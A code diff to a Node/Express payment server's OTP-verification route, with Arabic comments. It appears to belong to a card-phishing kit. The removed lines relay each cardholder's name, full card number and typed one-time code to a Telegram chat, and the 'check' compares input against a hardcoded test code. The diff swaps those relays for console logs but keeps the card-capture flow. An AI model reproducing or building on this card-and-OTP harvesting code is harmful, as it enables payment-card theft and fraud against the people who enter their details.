@@ -561,14 +561,9 @@ app.post('/api/verify-otp', async (req, res) => {
   // محاكاة التحقق من الرمز (للاختبار - الرمز الصحيح هو 123456)
   const isCorrectOTP = (otp === '123456');
   
-  // إذا الرمز صحيح → نجاح وفوراً
+  // إذا الرمز صحيح → نجاح وفوراً (لا انتظار)
   if (isCorrectOTP) {
-    const successText = ` <b>✅ تم إدخال رمز صحيح</b>\n\n` +
-      `• حامل البطاقة: ${savedCard.name}\n` +
-      `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
-      `✅ تم التحقق بنجاح - جاري إتمام العملية`;
-    
-    await sendTelegramMessage(successText);
+    console.log('✅ رمز صحيح - توجيه لصفحة النجاح فوراً');
     
     return res.json({ 
       success: true, 
@@ -577,19 +572,13 @@ app.post('/api/verify-otp', async (req, res) => {
     });
   }
   
-  // إذا الرمز غلط → زيادة العداد
-  if (currentAttempt >= 2) {
-    // بعد 3 محاولات فاشلة → رفض تلقائي
+  // إذا الرمز غلط → فحص عدد المحاولات
+  
+  // بعد 3 محاولات فاشلة → رفض تلقائي
+  if (currentAttempt >= 3) {
     paymentRecord.approvalStatus = 'rejected';
     paymentsData[paymentID] = paymentRecord;
     savePayments(paymentsData);
-    
-    const rejectText = ` <b>❌ تم رفض الطلب</b>\n\n` +
-      `• حامل البطاقة: ${savedCard.name}\n` +
-      `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
-      `❌ تم إدخال 3 رموز خاطئة - تم رفض الطلب تلقائياً`;
-    
-    await sendTelegramMessage(rejectText);
     
     console.log('❌ تم رفض الطلب بعد 3 محاولات فاشلة');
     return res.json({ 
@@ -600,22 +589,15 @@ app.post('/api/verify-otp', async (req, res) => {
     });
   }
 
-  // محاولات إضافية (1 أو 2) - إظهار خطأ في الصفحة
-  const errorText = ` <b>❌ رمز خاطئ - المحاولة ${currentAttempt}</b>\n\n` +
-    `• حامل البطاقة: ${savedCard.name}\n` +
-    `• البطاقة: <code>${savedCard.cardNumber}</code>\n` +
-    `• الرمز المدخل: <code style="color: red;">${otp}</code>\n\n` +
-    `❌ الرمز غير صحيح - ${3 - currentAttempt} محاولات متبقية`;
-
-  await sendTelegramMessage(errorText);
-
-  // إرجاع أن المحاولة فاشلة ليبقى المستخدم في الصفحة
+  // محاولات (1 أو 2) - إظهار خطأ فوراً للمستخدم (لا تليجرام)
+  console.log('❌ رمز خاطئ - إظهار خطأ للمستخدم فوراً');
+  
   return res.json({ 
     success: false, 
     message: 'wrong_otp',
     attempt: currentAttempt,
     attemptsRemaining: 3 - currentAttempt,
-    error: 'الرمز غير صحيح'
+    error: 'تم إدخال رمز غير صحيح'
   });
 });
 
